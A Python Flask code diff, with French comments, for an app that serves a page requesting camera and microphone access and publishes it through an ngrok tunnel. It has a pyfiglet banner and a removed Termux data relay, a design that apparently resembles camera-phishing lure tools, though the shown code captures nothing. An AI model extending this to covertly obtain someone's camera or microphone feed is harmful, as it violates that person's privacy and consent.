@@ -1,9 +1,7 @@
 from flask import Flask, render_template, request, jsonify
-from flask_socketio import SocketIO, emit
 import socket
 import pyfiglet
 import subprocess
-import json
 import time
 
 # Créer une interface ASCII art avec pyfiglet
@@ -28,7 +26,6 @@ display_interface()
 
 # Initialiser l'application Flask
 app = Flask(__name__)
-socketio = SocketIO(app)
 
 # Obtenir l'adresse IP locale
 def get_local_ip():
@@ -42,56 +39,47 @@ def get_local_ip():
         s.close()
     return ip
 
+# Fonction pour démarrer ngrok et obtenir l'URL public
+def get_ngrok_url():
+    # Lancer ngrok dans un sous-processus
+    ngrok_process = subprocess.Popen(["./ngrok", "http", "5000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    time.sleep(2)  # Attendre un peu pour que ngrok démarre
+    # Lire la sortie de ngrok pour obtenir l'URL publique
+    url_output = ngrok_process.stdout.read().decode("utf-8")
+    for line in url_output.splitlines():
+        if "Forwarding" in line:
+            ngrok_url = line.split(" ")[1]
+            return ngrok_url
+    return None
+
 @app.route("/")
 def home():
-    # Page qui demande l'accès à la caméra et au micro
+    # Page d'accueil qui demande l'accès à la caméra et au micro
     return render_template("camera.html")
 
 @app.route("/stream_link", methods=["POST"])
 def stream_link():
-    # Génère un lien contenant l'adresse IP et le port
+    # Génère un lien contenant l'adresse IP et le port local
     local_ip = get_local_ip()
-    port = 5000  # Remplacez si nécessaire
-    stream_url = f"http://{local_ip}:{port}/view_stream"
-    return jsonify({"stream_url": stream_url})
+    port = 5000
+    stream_url = f"http://{local_ip}:{port}/camera"  # Lien pour accéder à la caméra en local
 
-# Flux vidéo
-@app.route("/view_stream")
-def view_stream():
-    return render_template("view_stream.html")
-
-# Fonction pour démarrer ngrok et obtenir l'URL publique
-def get_ngrok_url():
-    # Démarre ngrok en arrière-plan
-    ngrok_process = subprocess.Popen(["./ngrok", "http", "5000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    time.sleep(3)  # Attendre que ngrok démarre
-    url = None
-
-    # Lire la sortie de ngrok pour obtenir l'URL publique
-    for line in ngrok_process.stdout:
-        line = line.decode("utf-8")
-        if "http" in line:
-            url = line.split(" ")[1].strip()
-            break
-
-    return url
-
-# Envoyer des données en temps réel vers Termux via socketio
-@socketio.on('send_data')
-def handle_data(message):
-    print(f"Data received: {message}")
-    emit('receive_data', {'data': f"Real-time Data: {message}"}, broadcast=True)
-
-if __name__ == "__main__":
-    # Démarrer ngrok pour exposer le serveur Flask
+    # Obtenir l'URL publique générée par ngrok
     ngrok_url = get_ngrok_url()
 
-    # Afficher l'URL ngrok
-    print(f"Serveur accessible à distance via : {ngrok_url}")
+    # Retourner les deux liens : un local et un distant (ngrok)
+    return jsonify({"local_stream_url": stream_url, "ngrok_stream_url": ngrok_url})
 
-    # Lancer l'application Flask
+# Flux vidéo
+@app.route("/camera")
+def camera():
+    # Ici vous pouvez implémenter le flux vidéo ou la logique pour afficher la vidéo de la caméra
+    return render_template("view_stream.html")
+
+if __name__ == "__main__":
+    # Exécuter le serveur Flask
     local_ip = get_local_ip()
-    print(f"Serveur local en cours d'exécution : http://{local_ip}:5000")
-    
-    # Démarrer le serveur SocketIO
-    socketio.run(app, host="0.0.0.0", port=5000)
+    print(f"Serveur en cours d'exécution sur http://{local_ip}:5000")
+
+    # Démarrer le serveur Flask
+    app.run(host="0.0.0.0", port=5000)
